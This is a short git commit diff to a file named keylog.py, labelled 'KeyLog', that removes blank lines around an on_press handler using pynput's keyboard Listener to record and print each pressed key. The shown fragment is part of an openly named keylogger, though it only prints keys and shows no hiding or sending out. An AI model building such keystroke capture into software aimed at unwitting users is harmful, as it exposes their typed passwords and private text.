a884f1506e6f8dad223883451b139b68ee428ba7
Vinod Polinati <vinodpolinati@gmail.com>
2022-11-08 22:17:34 -0800

    KeyLog

--- keylog.py
+++ keylog.py
@@ -3,10 +3,8 @@ from pynput.keyboard import Key, Listener
 count = 0
 keys = []
 
-
 def on_press(key):
     global keys, count
-    
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
